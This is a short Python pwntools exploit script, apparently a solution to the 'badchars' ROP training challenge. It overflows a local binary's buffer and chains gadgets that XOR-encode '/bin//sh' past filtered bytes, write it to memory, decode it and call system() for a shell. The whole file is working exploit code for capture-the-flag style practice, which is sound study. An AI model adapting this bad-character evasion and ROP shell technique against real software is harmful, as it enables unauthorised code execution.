#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *

'''
>>> b = ['b','i','c','/',' ','f','n','s']
>>> badchars = [hex(ord(i)) for i in b]
>>> badchars
['0x62', '0x69', '0x63', '0x2f', '0x20', '0x66', '0x6e', '0x73']
>>>
'''

def write_mem(address, string):
    chain =  p64(0x00400b3b)  # pop r12; pop r13; ret
    chain += string
    chain += p64(address)
    chain += p64(0x00400b34)  # mov [r13], r12; ret
    return chain

def decode(address, key):
    chain  = p64(0x00400b40)  # pop r14; pop r15; ret
    chain += p64(key)
    chain += p64(address)
    chain += p64(0x00400b30)  # xor [r15], r14b; ret
    return chain

# key = hex(ord('a')) = 0x61
def encode(s,key):
    return ''.join(chr(ord(i)^key) for i in s)

def exploit():
    p = process('./badchars')
    binary = ELF("badchars", checksec=False)
    systemPLT = binary.symbols["system"]
    address = 0x6010c8 # address to start write to
    key = 0x61

    # create payload
    payload = 40*"A"
    payload += write_mem(address,   encode('/bin//sh',key)) # write '/bin/sh' (encoded) into memory
    for i in range(len('/bin//sh')):
    	payload += decode((address + i), key)
    payload += p64(0x00400b39)  # pop rdi; ret
    payload += p64(address)
    payload += p64(systemPLT)
    payload += p64(0xcafebabe)

    p.sendlineafter('> ', payload)
    p.interactive()

if __name__ == '__main__':
    exploit()
#_EOF